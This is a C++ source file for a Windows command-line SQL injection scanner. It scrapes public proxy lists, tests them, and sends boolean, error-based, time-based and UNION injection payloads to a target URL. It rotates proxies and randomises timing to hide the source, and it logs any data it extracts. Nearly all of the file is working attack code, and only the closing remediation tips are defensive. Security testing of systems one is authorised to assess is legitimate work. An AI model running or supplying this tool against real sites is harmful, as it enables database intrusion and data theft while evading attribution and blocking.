#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <string>
#include <vector>
#include <cstring>
#include <sstream>
#include <algorithm>
#include <ctime>
#include <fstream>
#include <iomanip>
#include <map>
#include <random>
#include <thread>
#include <chrono>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

#define BUFFER_SIZE 131072
#define USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

using namespace std;

struct ProxyInfo {
    string host;
    int port;
    bool working;
    int responseTime;
    ProxyInfo() : port(0), working(false), responseTime(0) {}
};

struct Payload {
    string name;
    string payload;
    string technique;
};

struct Target {
    string host;
    int port;
    string path;
    string data;
    bool use_post;
    Target() : port(80), use_post(false) {}
};

vector<ProxyInfo> proxyList;
ProxyInfo currentProxy;
Target target;
vector<Payload> payloads;
string baseline_response;
int baseline_time;
ofstream logFile;
random_device rd;
mt19937 gen(rd());
uniform_int_distribution<> dis(100, 500);
int currentProxyIndex = 0;

vector<string> proxySources = {
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all"
};

void writeLog(const string& msg) {
    time_t now = time(nullptr);
    string t = ctime(&now);
    t.pop_back();
    logFile << "[" << t << "] " << msg << endl;
    logFile.flush();
}

void info(const string& msg) {
    cout << "[*] " << msg << endl;
    writeLog("[INFO] " + msg);
}

void success(const string& msg) {
    cout << "[+] " << msg << endl;
    writeLog("[SUCCESS] " + msg);
}

void error(const string& msg) {
    cout << "[-] " << msg << endl;
    writeLog("[ERROR] " + msg);
}

void vuln(const string& msg) {
    cout << "[!!!] " << msg << endl;
    writeLog("[VULNERABLE] " + msg);
}

string urlEncode(const string& str) {
    string encoded;
    for (char c : str) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            encoded += c;
        }
        else if (c == ' ') {
            encoded += '+';
        }
        else {
            char hex[4];
            sprintf_s(hex, sizeof(hex), "%%%02X", (unsigned char)c);
            encoded += hex;
        }
    }
    return encoded;
}

bool resolveHost(const string& host, string& ip) {
    struct hostent* he = gethostbyname(host.c_str());
    if (!he) return false;
    struct in_addr addr;
    memcpy(&addr, he->h_addr_list[0], sizeof(addr));
    ip = inet_ntoa(addr);
    return true;
}

string httpGet(const string& url) {
    string host, path;
    size_t start = 0;

    if (url.find("http://") == 0) start = 7;
    else if (url.find("https://") == 0) start = 8;

    size_t slash = url.find('/', start);
    if (slash != string::npos) {
        host = url.substr(start, slash - start);
        path = url.substr(slash);
    }
    else {
        host = url.substr(start);
        path = "/";
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) return "";

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(80);

    string ip;
    if (!resolveHost(host, ip)) {
        closesocket(sock);
        return "";
    }

    addr.sin_addr.s_addr = inet_addr(ip.c_str());

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(sock);
        return "";
    }

    string request = "GET " + path + " HTTP/1.1\r\n";
    request += "Host: " + host + "\r\n";
    request += "User-Agent: " USER_AGENT "\r\n";
    request += "Connection: close\r\n";
    request += "\r\n";

    send(sock, request.c_str(), request.length(), 0);

    char buffer[BUFFER_SIZE];
    string response;
    int n;
    while ((n = recv(sock, buffer, BUFFER_SIZE - 1, 0)) > 0) {
        buffer[n] = '\0';
        response += buffer;
        if (response.length() > 50000) break;
    }

    closesocket(sock);

    size_t body_start = response.find("\r\n\r\n");
    if (body_start != string::npos) {
        return response.substr(body_start + 4);
    }

    return response;
}

void parseProxyFromText(const string& content) {
    stringstream ss(content);
    string line;

    while (getline(ss, line)) {
        if (line.empty()) continue;

        ProxyInfo p;

        size_t colon = line.find(':');
        if (colon == string::npos) continue;

        p.host = line.substr(0, colon);

        size_t colon2 = line.find(':', colon + 1);
        if (colon2 != string::npos) {
            p.port = stoi(line.substr(colon + 1, colon2 - colon - 1));
        }
        else {
            size_t space = line.find(' ', colon + 1);
            if (space != string::npos) {
                p.port = stoi(line.substr(colon + 1, space - colon - 1));
            }
            else {
                p.port = stoi(line.substr(colon + 1));
            }
        }

        if (p.port > 0 && p.port < 65535) {
            proxyList.push_back(p);
        }
    }
}

void fetchProxies() {
    info("Downloading proxy list from " + to_string(proxySources.size()) + " sources");

    for (const string& source : proxySources) {
        info("Fetching from: " + source);

        string content = httpGet(source);

        if (!content.empty()) {
            parseProxyFromText(content);
            success("Got " + to_string(proxyList.size()) + " proxies so far");
        }
        else {
            error("Failed to fetch from " + source);
        }

        this_thread::sleep_for(chrono::seconds(1));
    }

    success("Total proxies collected: " + to_string(proxyList.size()));
}

bool testProxy(ProxyInfo& proxy) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) return false;

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(proxy.port);

    string ip;
    if (!resolveHost(proxy.host, ip)) {
        closesocket(sock);
        return false;
    }

    addr.sin_addr.s_addr = inet_addr(ip.c_str());

    auto start = chrono::steady_clock::now();

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(sock);
        return false;
    }

    auto end = chrono::steady_clock::now();
    proxy.responseTime = chrono::duration_cast<chrono::milliseconds>(end - start).count();

    string request = "GET http://httpbin.org/ip HTTP/1.1\r\n";
    request += "Host: httpbin.org\r\n";
    request += "Connection: close\r\n";
    request += "\r\n";

    send(sock, request.c_str(), request.length(), 0);

    char buffer[BUFFER_SIZE];
    string response;
    int n;
    while ((n = recv(sock, buffer, BUFFER_SIZE - 1, 0)) > 0) {
        buffer[n] = '\0';
        response += buffer;
        if (response.length() > 5000) break;
    }

    closesocket(sock);

    if (response.find(proxy.host) != string::npos) {
        proxy.working = true;
        return true;
    }

    return false;
}

void filterWorkingProxies() {
    info("Testing " + to_string(proxyList.size()) + " proxies");

    vector<ProxyInfo> workingProxies;
    int tested = 0;

    for (ProxyInfo& p : proxyList) {
        tested++;
        cout << "\rTesting: " << tested << "/" << proxyList.size() << " - " << p.host << ":" << p.port << "   ";

        if (testProxy(p)) {
            workingProxies.push_back(p);
            cout << endl;
            success("Working proxy: " + p.host + ":" + to_string(p.port) + " (" + to_string(p.responseTime) + "ms)");
        }

        if (tested % 10 == 0) {
            this_thread::sleep_for(chrono::milliseconds(500));
        }
    }

    cout << endl;
    proxyList = workingProxies;

    sort(proxyList.begin(), proxyList.end(), [](const ProxyInfo& a, const ProxyInfo& b) {
        return a.responseTime < b.responseTime;
        });

    success("Found " + to_string(proxyList.size()) + " working proxies");
}

bool sendViaProxy(const string& request, string& response, int& response_time, ProxyInfo& proxy) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) return false;

    struct sockaddr_in proxy_addr;
    memset(&proxy_addr, 0, sizeof(proxy_addr));
    proxy_addr.sin_family = AF_INET;
    proxy_addr.sin_port = htons(proxy.port);

    string proxy_ip;
    if (!resolveHost(proxy.host, proxy_ip)) {
        closesocket(sock);
        return false;
    }

    proxy_addr.sin_addr.s_addr = inet_addr(proxy_ip.c_str());

    if (connect(sock, (struct sockaddr*)&proxy_addr, sizeof(proxy_addr)) == SOCKET_ERROR) {
        closesocket(sock);
        return false;
    }

    string proxy_request = "CONNECT " + target.host + ":" + to_string(target.port) + " HTTP/1.1\r\n";
    proxy_request += "Host: " + target.host + "\r\n";
    proxy_request += "User-Agent: " USER_AGENT "\r\n";
    proxy_request += "Proxy-Connection: Keep-Alive\r\n";
    proxy_request += "\r\n";

    if (send(sock, proxy_request.c_str(), proxy_request.length(), 0) == SOCKET_ERROR) {
        closesocket(sock);
        return false;
    }

    char buffer[BUFFER_SIZE];
    memset(buffer, 0, BUFFER_SIZE);
    int n = recv(sock, buffer, BUFFER_SIZE - 1, 0);
    string response_connect(buffer);

    if (response_connect.find("200") == string::npos) {
        closesocket(sock);
        return false;
    }

    clock_t start = clock();
    if (send(sock, request.c_str(), request.length(), 0) == SOCKET_ERROR) {
        closesocket(sock);
        return false;
    }

    response.clear();
    while ((n = recv(sock, buffer, BUFFER_SIZE - 1, 0)) > 0) {
        buffer[n] = '\0';
        response += buffer;
        if (response.length() >= BUFFER_SIZE - 1024) break;
    }

    clock_t end = clock();
    response_time = (int)((double)(end - start) * 1000 / CLOCKS_PER_SEC);

    closesocket(sock);
    return true;
}

bool sendDirect(const string& request, string& response, int& response_time) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) return false;

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target.port);

    string server_ip;
    if (!resolveHost(target.host, server_ip)) {
        closesocket(sock);
        return false;
    }

    server_addr.sin_addr.s_addr = inet_addr(server_ip.c_str());

    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        closesocket(sock);
        return false;
    }

    clock_t start = clock();
    if (send(sock, request.c_str(), request.length(), 0) == SOCKET_ERROR) {
        closesocket(sock);
        return false;
    }

    response.clear();
    char buffer[BUFFER_SIZE];
    int n;
    while ((n = recv(sock, buffer, BUFFER_SIZE - 1, 0)) > 0) {
        buffer[n] = '\0';
        response += buffer;
        if (response.length() >= BUFFER_SIZE - 1024) break;
    }

    clock_t end = clock();
    response_time = (int)((double)(end - start) * 1000 / CLOCKS_PER_SEC);

    closesocket(sock);
    return true;
}

string createHTTPRequest(const string& param_value) {
    string request;

    if (target.use_post) {
        string post_data = target.data;
        size_t inject_pos = post_data.find("[INJECT]");
        if (inject_pos != string::npos) {
            post_data.replace(inject_pos, 8, param_value);
        }

        request = "POST " + target.path + " HTTP/1.1\r\n";
        request += "Host: " + target.host + "\r\n";
        request += "User-Agent: " USER_AGENT "\r\n";
        request += "Content-Type: application/x-www-form-urlencoded\r\n";
        request += "Content-Length: " + to_string(post_data.length()) + "\r\n";
        request += "Connection: close\r\n";
        request += "\r\n";
        request += post_data;
    }
    else {
        string full_path = target.path + param_value;
        request = "GET " + full_path + " HTTP/1.1\r\n";
        request += "Host: " + target.host + "\r\n";
        request += "User-Agent: " USER_AGENT "\r\n";
        request += "Accept: */*\r\n";
        request += "Connection: close\r\n";
        request += "\r\n";
    }

    return request;
}

bool sendRequest(const string& payload_value, string& response, int& response_time) {
    string final_payload = target.use_post ? payload_value : urlEncode(payload_value);
    string request = createHTTPRequest(final_payload);

    if (!proxyList.empty() && currentProxyIndex < proxyList.size()) {
        currentProxy = proxyList[currentProxyIndex];
        return sendViaProxy(request, response, response_time, currentProxy);
    }

    return sendDirect(request, response, response_time);
}

void rotateProxy() {
    if (!proxyList.empty()) {
        currentProxyIndex = (currentProxyIndex + 1) % proxyList.size();
        currentProxy = proxyList[currentProxyIndex];
        info("Switched to proxy: " + currentProxy.host + ":" + to_string(currentProxy.port));
    }
}

bool hasSQLError(const string& response) {
    vector<string> errors = {
        "SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL",
        "SQLite", "Unclosed quotation", "Microsoft OLE DB",
        "You have an error", "Warning: mysql", "mysqli_sql_exception",
        "PDOException", "SQLSTATE", "Unknown column",
        "Table doesn't exist", "Division by zero"
    };

    string resp_lower = response;
    transform(resp_lower.begin(), resp_lower.end(), resp_lower.begin(), ::tolower);

    for (const auto& err : errors) {
        string err_lower = err;
        transform(err_lower.begin(), err_lower.end(), err_lower.begin(), ::tolower);
        if (resp_lower.find(err_lower) != string::npos) return true;
    }
    return false;
}

bool responsesDiffer(const string& resp1, const string& resp2) {
    int len1 = (int)resp1.length();
    int len2 = (int)resp2.length();

    if (abs(len1 - len2) > 100) return true;

    vector<string> keywords = { "error", "invalid", "warning", "success", "welcome", "found" };

    for (const auto& kw : keywords) {
        bool in1 = (resp1.find(kw) != string::npos);
        bool in2 = (resp2.find(kw) != string::npos);
        if (in1 != in2) return true;
    }

    return false;
}

string extractUnionData(const string& response) {
    size_t body_start = response.find("\r\n\r\n");
    if (body_start == string::npos) return "";

    string body = response.substr(body_start + 4);

    size_t data_start = body.find(":-:");
    if (data_start == string::npos) data_start = body.find("---");
    if (data_start == string::npos) data_start = body.find(">");
    if (data_start != string::npos) data_start++;

    if (data_start == string::npos) return "";

    size_t data_end = body.find("<br>", data_start);
    if (data_end == string::npos) data_end = body.find("\n", data_start);
    if (data_end == string::npos) data_end = body.find("</", data_start);
    if (data_end == string::npos) data_end = body.length();

    if (data_end > data_start && (data_end - data_start) < 500) {
        string data = body.substr(data_start, data_end - data_start);
        data.erase(remove(data.begin(), data.end(), '\n'), data.end());
        data.erase(remove(data.begin(), data.end(), '\r'), data.end());

        size_t start = data.find_first_not_of(" \t\n\r");
        size_t end = data.find_last_not_of(" \t\n\r");
        if (start != string::npos && end != string::npos) {
            data = data.substr(start, end - start + 1);
        }

        if (!data.empty()) return data;
    }

    return "";
}

void initPayloads() {
    payloads.push_back({ "Boolean - AND true", "' AND '1'='1", "boolean" });
    payloads.push_back({ "Boolean - AND false", "' AND '1'='2", "boolean" });
    payloads.push_back({ "Boolean - OR true", "' OR '1'='1", "boolean" });
    payloads.push_back({ "Boolean - OR false", "' OR '1'='2", "boolean" });
    payloads.push_back({ "Error - MySQL", "' AND extractvalue(1,concat(0x7e,database()))-- -", "error" });
    payloads.push_back({ "Error - MySQL updatexml", "' AND updatexml(1,concat(0x7e,database()),1)-- -", "error" });
    payloads.push_back({ "Error - PostgreSQL", "' AND 1=cast((SELECT version()) as int)-- -", "error" });
    payloads.push_back({ "Error - MSSQL", "' AND 1=convert(int,@@version)-- -", "error" });
    payloads.push_back({ "Time - MySQL", "' AND SLEEP(5)-- -", "time" });
    payloads.push_back({ "Time - PostgreSQL", "' AND pg_sleep(5)-- -", "time" });
    payloads.push_back({ "Time - MSSQL", "'; WAITFOR DELAY '00:00:05'-- -", "time" });
    payloads.push_back({ "Union - 1 column", "' UNION SELECT NULL-- -", "union" });
    payloads.push_back({ "Union - 2 columns", "' UNION SELECT NULL,NULL-- -", "union" });
    payloads.push_back({ "Union - 3 columns", "' UNION SELECT NULL,NULL,NULL-- -", "union" });
    payloads.push_back({ "Union - 4 columns", "' UNION SELECT NULL,NULL,NULL,NULL-- -", "union" });
    payloads.push_back({ "Union - 5 columns", "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -", "union" });
    payloads.push_back({ "Union - 6 columns", "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -", "union" });
}

void printBanner() {
    cout << "\n========================================" << endl;
    cout << "   SQL INJECTION SCANNER WITH PROXY" << endl;
    cout << "========================================" << endl;
}

void scan() {
    printBanner();

    info("Target: " + target.host + ":" + to_string(target.port) + target.path);
    info("Method: " + string(target.use_post ? "POST" : "GET"));
    if (!proxyList.empty()) {
        info("Using proxy: " + currentProxy.host + ":" + to_string(currentProxy.port));
    }
    else {
        info("No proxy configured");
    }

    info("Getting baseline response...");
    if (!sendRequest("''", baseline_response, baseline_time)) {
        error("Cannot connect to target");
        return;
    }
    success("Baseline: " + to_string(baseline_response.length()) + " bytes, " + to_string(baseline_time) + " ms");

    bool vulnerable = false;
    string found_technique;
    vector<string> extracted_data;
    int vuln_count = 0;

    info("Testing " + to_string(payloads.size()) + " payloads");

    for (size_t i = 0; i < payloads.size(); i++) {
        cout << "[" << (i + 1) << "/" << payloads.size() << "] " << payloads[i].name << "... ";
        cout.flush();

        string response;
        int response_time;

        if (!sendRequest(payloads[i].payload, response, response_time)) {
            cout << "FAILED" << endl;
            error("Request failed for: " + payloads[i].name);
            continue;
        }

        bool is_vuln = false;
        string extra;

        if (payloads[i].technique == "error") {
            if (hasSQLError(response)) {
                is_vuln = true;
                extra = "SQL error detected";
            }
        }
        else if (payloads[i].technique == "boolean") {
            if (responsesDiffer(baseline_response, response)) {
                is_vuln = true;
                extra = "Response differs";
            }
        }
        else if (payloads[i].technique == "time") {
            if (response_time > baseline_time + 4000) {
                is_vuln = true;
                extra = "Delay: " + to_string(response_time) + "ms";
            }
        }
        else if (payloads[i].technique == "union") {
            string data = extractUnionData(response);
            if (!data.empty()) {
                is_vuln = true;
                extra = "Extracted: " + data;
                extracted_data.push_back(data);
            }
            else if (response.length() != baseline_response.length()) {
                is_vuln = true;
                extra = "Response size changed";
            }
        }

        if (is_vuln) {
            cout << "VULNERABLE! (" << extra << ")" << endl;
            vuln("Found: " + payloads[i].name + " - " + extra);
            vulnerable = true;
            vuln_count++;
            if (found_technique.empty()) {
                found_technique = payloads[i].technique;
            }
            rotateProxy();
        }
        else {
            cout << "Not vulnerable" << endl;
        }

        this_thread::sleep_for(chrono::milliseconds(dis(gen)));
    }

    cout << "\n========================================" << endl;

    if (vulnerable) {
        vuln("SQL INJECTION VULNERABILITY CONFIRMED!");
        success("Vulnerable payloads found: " + to_string(vuln_count));
        success("Primary technique: " + found_technique);

        if (!extracted_data.empty()) {
            info("Extracted data:");
            for (const auto& data : extracted_data) {
                cout << "  -> " << data << endl;
                writeLog("[DATA] " + data);
            }
        }

        info("Recommendations:");
        info("  1. Use parameterized queries");
        info("  2. Implement input validation");
        info("  3. Use WAF");
        info("  4. Limit database privileges");
        info("  5. Disable error messages");
    }
    else {
        success("No SQL injection vulnerability detected");
    }

    cout << "========================================" << endl;
    info("Log saved to: sql_scan_log.txt");
}

bool parseArguments(int argc, char* argv[], Target& target) {
    if (argc < 3) {
        cout << "Usage: " << argv[0] << " -u <url> [--data=postdata]" << endl;
        cout << "Example: " << argv[0] << " -u \"http://test.com/page.php?id=1\"" << endl;
        cout << "Example: " << argv[0] << " -u \"http://test.com/login.php\" --data=\"user=admin&pass=[INJECT]\"" << endl;
        return false;
    }

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-u") == 0 && i + 1 < argc) {
            string url = argv[++i];

            if (url.find("http://") == 0) {
                url = url.substr(7);
            }
            else if (url.find("https://") == 0) {
                url = url.substr(8);
                target.port = 443;
                target.port = 80;
            }

            size_t slash_pos = url.find('/');
            if (slash_pos != string::npos) {
                target.host = url.substr(0, slash_pos);
                target.path = url.substr(slash_pos);
            }
            else {
                target.host = url;
                target.path = "/";
            }

            size_t colon_pos = target.host.find(':');
            if (colon_pos != string::npos) {
                target.port = stoi(target.host.substr(colon_pos + 1));
                target.host = target.host.substr(0, colon_pos);
            }
        }
        else if (strncmp(argv[i], "--data=", 7) == 0) {
            target.data = argv[i] + 7;
            target.use_post = true;
        }
    }

    if (target.host.empty() || target.path.empty()) {
        cout << "Invalid URL" << endl;
        return false;
    }

    return true;
}

int main(int argc, char* argv[]) {
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);
    SetConsoleTitle(TEXT("SQL Injection Scanner"));

    logFile.open("sql_scan_log.txt", ios::app);
    if (!logFile.is_open()) {
        cout << "Cannot open log file" << endl;
        return 1;
    }

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        error("Winsock initialization failed");
        return 1;
    }

    if (!parseArguments(argc, argv, target)) {
        WSACleanup();
        return 1;
    }

    fetchProxies();

    if (!proxyList.empty()) {
        filterWorkingProxies();
        if (!proxyList.empty()) {
            currentProxy = proxyList[0];
            success("Using proxy: " + currentProxy.host + ":" + to_string(currentProxy.port));
        }
    }

    initPayloads();
    scan();

    logFile.close();
    WSACleanup();

    cout << "\nPress any key to exit...";
    cin.get();

    return 0;
}
